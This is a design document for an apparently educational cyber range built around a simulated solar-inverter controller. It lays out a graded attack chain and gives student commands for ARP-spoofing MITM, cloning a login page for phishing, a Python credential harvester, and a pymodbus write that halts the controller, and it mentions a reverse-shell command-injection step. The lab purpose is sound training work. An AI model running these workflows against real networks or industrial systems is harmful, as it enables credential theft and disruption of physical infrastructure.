# Smart Home PV - Cyber Range Design Document

## Philosophy: From CTF Game to Realistic Cyber Range

### Problem with Previous Design
- Flags were just curl endpoints - no real attacks needed
- `/do_arp_spoof` endpoint - fake MITM simulation
- Admin panel had no authentication
- Phishing page existed but wasn't required
- No actual network packet analysis required

### New Cyber Range Approach

## Attack Chain (Enforced Sequence)

```
Phase 1: RECONNAISSANCE (10 pts)
├── Network scanning (nmap actual traffic)
├── MQTT enumeration (mosquitto_sub to discover topics)
└── WiFi credential discovery (/wifi_scan still available as breadcrumb)
    └── FLAG 1: Appears in server logs ONLY after capturing ARP traffic

Phase 2: NETWORK ATTACKS (25 pts)
├── ARP Spoofing (must use arpspoof/ettercap - NO /do_arp_spoof endpoint!)
│   ├── User must MITM between victim (172.20.0.72) and MQTT broker (172.20.0.66)
│   ├── Session token ONLY visible in sniffed packets (tcpdump/wireshark required)
│   └── FLAG 2: Embedded in MQTT packet payload after successful sniff
│
└── Packet Capture & Analysis
    ├── User must run tcpdump to capture traffic to pcap file
    ├── Analyze pcap to extract session token from MQTT CONNECT packet
    └── Session token format: "mqtt-session-<random>" in UserProperties field

Phase 3: CREDENTIAL THEFT (20 pts)
├── Phishing Infrastructure
│   ├── Clone legitimate /login page using wget/httrack
│   ├── Modify HTML to POST to attacker-controlled endpoint
│   ├── Host phishing page using python http.server
│   ├── Victim container (Puppeteer) receives "email" (HTTP endpoint call)
│   ├── Victim clicks link ONLY if it looks legitimate (checks favicon, CSS, form fields)
│   └── FLAG 3: Appears in /flag/phishing ONLY after victim submits credentials
│
└── Credential Harvesting
    ├── Attacker receives POST with username/password
    ├── Credentials stored in attacker's local file
    └── Username: admin, Password: PV-Sec-2024!Admin (strong, not WiFi password)

Phase 4: AUTHENTICATED ACCESS (20 pts)
├── Login to Admin Dashboard
│   ├── Use phished credentials at /admin/login
│   ├── Admin panel is professional React dashboard (not simple HTML)
│   ├── Shows real-time SCADA telemetry, device status, historical graphs
│   └── FLAG 4: Visible in dashboard's "System Diagnostics" tab after login
│
└── REST API Access
    ├── Use /api/login with stolen credentials
    ├── Receive JWT token (expires in 30 minutes - realistic)
    └── Token required for all API operations

Phase 5: ICS PROTOCOL EXPLOITATION (25 pts)
├── Modbus Traffic Analysis
│   ├── Capture Modbus traffic using tcpdump
│   ├── Analyze legitimate Modbus READ requests in Wireshark
│   ├── Identify function codes, register addresses
│   └── Craft Modbus WRITE request using pymodbus (not raw TCP)
│
├── Modbus Attack
│   ├── Use pymodbus.client to write to coil 1 (HALT control)
│   ├── Function code 0x05 (Write Single Coil)
│   ├── Address: 1, Value: True (enable HALT)
│   └── Server validates proper Modbus framing
│
└── FLAG 5: Appears in /logs/modbus_attacks.log after valid Modbus write
    └── Log entry format: "MODBUS_ATTACK: FLAG{...} from IP X"

Phase 6: IMPACT & PERSISTENCE (Advanced - Optional)
├── Command Injection in Device Management
│   ├── Admin panel has device name field vulnerable to command injection
│   ├── Inject reverse shell payload
│   ├── Gain shell access to container
│   └── FLAG 6: Located in /root/.flag.txt (requires shell access)
│
└── MQTT Persistence
    ├── Publish to admin topic: pv/admin/config
    ├── Inject malicious configuration
    └── Config persists across container restarts
```

## Technical Implementation

### 1. Flags Distribution

```python
# OLD (Game-like):
@app.route("/flag_mqtt")
def get_mqtt_flag():
    return jsonify({"flag": FLAG_MQTT_HIJACK})

# NEW (Cyber Range):
@app.route("/flag/mqtt")
def get_mqtt_flag():
    # Only return flag if user actually sniffed the network
    if not events_done.get('arp_spoof_detected'):
        return jsonify({"error": "No ARP spoofing activity detected"}), 403
    if not events_done.get('mqtt_session_stolen'):
        return jsonify({"error": "MQTT session not captured"}), 403
    return jsonify({"flag": FLAG_MQTT_HIJACK, "note": "Captured via network sniffing"})
```

### 2. ARP Spoofing Detection

```python
# Detect actual ARP spoofing by monitoring ARP table changes
# Victim container monitors its ARP cache and reports suspicious entries
# Attacker must use: arpspoof -i eth0 -t 172.20.0.72 172.20.0.66

import threading
import subprocess
import re

def arp_monitor_thread():
    """Monitor ARP table for spoofing indicators"""
    baseline = {}
    while True:
        try:
            result = subprocess.check_output(['arp', '-an']).decode()
            current = {}
            for line in result.splitlines():
                match = re.search(r'\(([\d\.]+)\) at ([0-9a-f:]+)', line)
                if match:
                    ip, mac = match.groups()
                    current[ip] = mac
            
            # Detect MAC address changes (spoofing indicator)
            for ip, mac in current.items():
                if ip in baseline and baseline[ip] != mac:
                    logging.warning(f"ARP SPOOFING DETECTED: {ip} changed from {baseline[ip]} to {mac}")
                    events_done['arp_spoof_detected'] = True
                    # Trigger flag appearance in MQTT traffic
                    inject_flag_into_mqtt()
            
            baseline = current
            time.sleep(5)
        except Exception as e:
            logging.error(f"ARP monitor error: {e}")
            time.sleep(10)

threading.Thread(target=arp_monitor_thread, daemon=True).start()
```

### 3. Realistic Phishing Infrastructure

```python
# Victim simulation (enhanced victim_runner.js)
async function checkEmail() {
    // Victim periodically checks for "emails" at endpoint
    const response = await fetch('http://pv-controller/api/internal/inbox');
    const emails = await response.json();
    
    for (const email of emails) {
        if (email.subject.includes('Security Alert') || email.subject.includes('Password Reset')) {
            // Victim is more likely to click security-themed phishing
            console.log('Victim: Clicking phishing link:', email.link);
            await page.goto(email.link);
            
            // Validate page looks legitimate
            const hasLogo = await page.$('.logo');
            const hasSSL = email.link.startsWith('https') || email.link.includes('secure');
            const hasFormFields = await page.$('input[name="username"]') && await page.$('input[type="password"]');
            
            if (hasFormFields && (hasLogo || hasSSL)) {
                // Victim fills in credentials
                await page.type('input[name="username"]', 'admin');
                await page.type('input[type="password"]', 'PV-Sec-2024!Admin');
                await page.click('button[type="submit"]');
                
                // Mark phishing as successful
                await fetch('http://pv-controller/api/internal/phish_success', {method: 'POST'});
            } else {
                console.log('Victim: Phishing page looks suspicious, not entering credentials');
            }
        }
    }
}

# Attacker workflow
# 1. Clone login page
wget -r -k -p http://172.20.0.65/login -O phishing/

# 2. Modify form action to attacker's server
<form action="http://172.20.0.70:8000/steal" method="POST">

# 3. Host phishing server
cd phishing/
python3 -m http.server 8000

# 4. Send phishing email (via API endpoint accessible to attacker)
curl -X POST http://172.20.0.65/api/send_email \
  -H "Content-Type: application/json" \
  -d '{
    "to": "admin@pv-controller.local",
    "subject": "URGENT: Security Alert - Password Reset Required",
    "link": "http://172.20.0.70:8000/login.html"
  }'
```

### 4. Professional Admin Dashboard

Create React-based dashboard:

```javascript
// static/dashboard/App.jsx
import React, { useState, useEffect } from 'react';
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip } from 'recharts';

function AdminDashboard() {
    const [auth, setAuth] = useState(false);
    const [telemetry, setTelemetry] = useState([]);
    const [devices, setDevices] = useState([]);
    
    const login = async (username, password) => {
        const response = await fetch('/api/admin/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({username, password})
        });
        
        if (response.ok) {
            const data = await response.json();
            localStorage.setItem('admin_token', data.token);
            setAuth(true);
            loadDashboard();
        }
    };
    
    const loadDashboard = async () => {
        const token = localStorage.getItem('admin_token');
        
        // Load real-time telemetry
        const tel = await fetch('/api/admin/telemetry', {
            headers: {'Authorization': `Bearer ${token}`}
        });
        setTelemetry(await tel.json());
        
        // Load device status
        const dev = await fetch('/api/admin/devices', {
            headers: {'Authorization': `Bearer ${token}`}
        });
        setDevices(await dev.json());
    };
    
    if (!auth) {
        return <LoginForm onLogin={login} />;
    }
    
    return (
        <div className="scada-dashboard">
            <header>
                <h1>PV Management System v2.4.1</h1>
                <div className="system-status">
                    <span className="status-indicator green">OPERATIONAL</span>
                </div>
            </header>
            
            <div className="grid-layout">
                <div className="card">
                    <h2>Power Generation</h2>
                    <LineChart width={600} height={300} data={telemetry}>
                        <CartesianGrid strokeDasharray="3 3" />
                        <XAxis dataKey="timestamp" />
                        <YAxis />
                        <Tooltip />
                        <Line type="monotone" dataKey="power_kw" stroke="#82ca9d" />
                    </LineChart>
                </div>
                
                <div className="card">
                    <h2>System Diagnostics</h2>
                    <table className="diagnostics">
                        <tr><td>Inverter Status:</td><td className="green">RUNNING</td></tr>
                        <tr><td>Grid Sync:</td><td className="green">LOCKED</td></tr>
                        <tr><td>MQTT Broker:</td><td className="green">CONNECTED</td></tr>
                        <tr><td>Modbus Server:</td><td className="green">LISTENING</td></tr>
                        <tr><td>Security Flag:</td><td><code>{FLAG_ADMIN_PANEL}</code></td></tr>
                    </table>
                </div>
                
                <div className="card">
                    <h2>Connected Devices</h2>
                    <DeviceManagement devices={devices} />
                </div>
            </div>
        </div>
    );
}
```

### 5. Modbus Protocol Realism

```python
# Remove simplified TCP server, use ONLY pymodbus
# Server validates proper Modbus framing

from pymodbus.server import StartTcpServer
from pymodbus.datastore import ModbusSequentialDataBlock, ModbusSlaveContext, ModbusServerContext

# Define registers
store = ModbusSlaveContext(
    co=ModbusSequentialDataBlock(0, [0]*100),  # Coils
    hr=ModbusSequentialDataBlock(0, [0]*100),  # Holding Registers
)

# Coil 1: HALT control (0=normal, 1=halted)
# Register 40001: Power setpoint (W)
# Register 40002: Voltage (V)

def modbus_write_callback(address, values):
    """Called when Modbus WRITE occurs"""
    logging.warning(f"MODBUS WRITE: Address={address}, Values={values}")
    
    if address == 1 and values[0] == 1:  # Coil 1 set to TRUE
        logging.critical(f"MODBUS ATTACK DETECTED: HALT command from client")
        events_done['modbus_halt'] = True
        set_halt('modbus')
        
        # Write flag to log file
        with open('/opt/pv-controller/logs/modbus_attacks.log', 'a') as f:
            f.write(f"{time.time()},MODBUS_ATTACK,{FLAG_MODBUS}\n")

# Attach callback to datastore
store.register_write_callback(modbus_write_callback)

# Start server
StartTcpServer(context=ModbusServerContext(slaves=store, single=True),
               address=("0.0.0.0", 502))  # Standard Modbus port
```

## Validation Mechanisms

### Event Sequencing
```python
def validate_challenge_state(required_event):
    """Ensures challenges are completed in realistic order"""
    dependencies = {
        'arp_spoof': [],
        'mqtt_sniff': ['arp_spoof'],
        'phishing': ['mqtt_sniff'],
        'admin_access': ['phishing'],
        'modbus_attack': ['admin_access']
    }
    
    for dep in dependencies.get(required_event, []):
        if not events_done.get(dep):
            return False, f"Must complete {dep} before {required_event}"
    
    return True, "OK"
```

### Anti-Cheat Measures
```python
# Prevent shortcuts
@app.route("/flag/<flag_type>")
def get_flag(flag_type):
    valid, msg = validate_challenge_state(flag_type)
    if not valid:
        return jsonify({"error": msg}), 403
    
    # Additional validation: check timestamps
    if flag_type == 'mqtt_sniff':
        # Flag only valid if captured within 60s of ARP spoof
        if time.time() - events_done.get('arp_spoof_time', 0) > 60:
            return jsonify({"error": "MQTT sniff window expired"}), 403
    
    return jsonify({"flag": FLAGS[flag_type]})
```

## Student Workflow Example

### Task 1: Network Reconnaissance
```bash
# Student commands (all REAL):
nmap -sV -p- 172.20.0.0/24
nmap -sC -sV 172.20.0.65
mosquitto_sub -h 172.20.0.66 -t '#' -v

# Discover:
# - 172.20.0.65:80 (web), 172.20.0.65:502 (modbus)
# - 172.20.0.66:1883 (MQTT)
# - 172.20.0.72 (victim workstation)
```

### Task 2: ARP Spoofing & Packet Capture
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start packet capture
tcpdump -i eth0 -w /tmp/mitm.pcap &

# ARP spoof (MITM between victim and MQTT broker)
arpspoof -i eth0 -t 172.20.0.72 -r 172.20.0.66

# Wait for victim to generate MQTT traffic...
# After 30-60 seconds, stop arpspoof (Ctrl+C)

# Analyze capture in Wireshark
wireshark /tmp/mitm.pcap

# Look for MQTT CONNECT packet
# Extract session token from User Properties field
# Session token visible in cleartext (no TLS)
```

### Task 3: Phishing Attack
```bash
# Clone legitimate login page
wget --mirror --convert-links --page-requisites http://172.20.0.65/login

# Modify index.html form action
sed -i 's|action="/api/login"|action="http://172.20.0.70:8000/harvest"|' 172.20.0.65/login/index.html

# Create credential harvester
cat > harvest.py << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(length))
        print(f"[+] Captured credentials: {data}")
        with open('/tmp/creds.txt', 'a') as f:
            f.write(f"{data['username']}:{data['password']}\n")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
EOF

python3 harvest.py &

# Host phishing page
cd 172.20.0.65/login
python3 -m http.server 8001 &

# Send phishing email to victim
curl -X POST http://172.20.0.65/api/send_phish \
  -H "Content-Type: application/json" \
  -d '{
    "target": "admin@pv-controller.local",
    "subject": "CRITICAL: System Security Alert",
    "body": "Unusual activity detected. Please verify your credentials immediately.",
    "link": "http://172.20.0.70:8001/index.html"
  }'

# Wait for victim to click and submit credentials
# Credentials appear in /tmp/creds.txt
cat /tmp/creds.txt
# admin:PV-Sec-2024!Admin
```

### Task 4: Access Admin Dashboard
```bash
# Use stolen credentials
curl -X POST http://172.20.0.65/api/admin/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"PV-Sec-2024!Admin"}'

# Response: {"token": "eyJ0eXAiOiJKV1QiLCJhbGc..."}

# Access admin dashboard in browser
firefox http://172.20.0.65/admin

# Login with stolen credentials
# Navigate to "System Diagnostics" tab
# FLAG visible in diagnostics table
```

### Task 5: Modbus Attack
```bash
# Analyze Modbus traffic
tcpdump -i eth0 -w /tmp/modbus.pcap port 502 &

# Wait for legitimate Modbus traffic from automation scripts...

# Analyze in Wireshark:
# - Function code 0x03 (Read Holding Registers)
# - Register addresses: 40001-40010

# Craft Modbus WRITE attack
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('172.20.0.65', port=502)
client.connect()

# Write to coil 1 (HALT control)
result = client.write_coil(1, True)
print(f"Modbus write result: {result}")

client.close()
EOF

# Check logs for flag
curl http://172.20.0.65/api/admin/logs?file=modbus_attacks.log \
  -H "Authorization: Bearer <admin_token>"
```

## Grading Rubric

| Task | Points | Validation Method |
|------|--------|-------------------|
| Network scan (nmap output) | 5 | Submit scan results |
| ARP spoofing (pcap evidence) | 10 | Submit pcap showing ARP replies |
| MQTT session capture | 10 | Extract session token from pcap |
| Phishing page creation | 10 | Submit modified HTML + screenshot |
| Credential harvesting | 10 | Show captured credentials |
| Admin dashboard access | 15 | Screenshot of logged-in dashboard |
| Modbus protocol analysis | 10 | Wireshark screenshot of Modbus packets |
| Modbus HALT attack | 20 | Submit log file with attack evidence |
| Command injection (optional) | 10 | Submit shell screenshot + flag |
| **TOTAL** | **100** | |

## Deployment Changes

```yaml
# docker-compose.yml additions
services:
  victim:
    environment:
      - VICTIM_EMAIL=admin@pv-controller.local
      - CHECK_EMAIL_INTERVAL=30
      - PHISHING_SUSCEPTIBILITY=high  # Will click security-themed emails
  
  attacker:
    cap_add:
      - NET_RAW
      - NET_ADMIN  # Required for arpspoof
    devices:
      - /dev/net/tun  # For VPN tunneling
```

## Documentation Updates

- WALKTHROUGH.md → Focus on tool usage, not curl commands
- Add TOOLS.md → Comprehensive guide to arpspoof, tcpdump, Wireshark, pymodbus
- Add REPORT_TEMPLATE.md → Students document their attack methodology
- Remove CHEAT_SHEET.md → No more copy-paste solutions

## Success Metrics

Students should spend:
- 30-45 min on network attacks (ARP spoofing, packet capture)
- 45-60 min on phishing infrastructure
- 20-30 min on Modbus analysis and exploitation
- **Total: 2-3 hours for realistic cyber range experience**

vs. previous 10-15 minutes of curl commands.
